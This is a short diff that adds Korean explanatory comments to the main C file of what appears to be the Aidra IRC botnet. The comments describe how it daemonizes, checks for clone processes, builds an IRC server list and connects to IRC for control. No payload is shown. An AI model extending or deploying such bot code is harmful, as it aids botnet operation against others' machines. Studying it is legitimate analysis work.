@@ -15,9 +15,9 @@
 
 #include "../include/headers.h"
 
-void daemonize();
-void create_irc_servlist();
-int connect_to_irc(sock_t * sp);
+void daemonize();					// from utils.c
+void create_irc_servlist();			// from utils,c
+int connect_to_irc(sock_t * sp);	// from irc.c
 
 int main(int argc, char **argv) {
     sock_t *sp;
@@ -48,3 +48,11 @@ retry:
 
     return EXIT_SUCCESS;
 }
+
+/*
+ * Aidra가 백그라운드에서 실행중이지 않다면, 백그라운드에서 실행시킨다.
+ * pidprocess() 에서는 파일의 권한을 확인하고 그 파일이 존재한다면
+ * 프로세스 넘버를 확인해서 삭제하고(클론체크), 프로세스를 생성한다.
+ * isrv 메모리 공간을 10개 할당하고 conter를 0으로 만듬.
+ * 그 후 create_irc_servlist() 실행. 
+ */
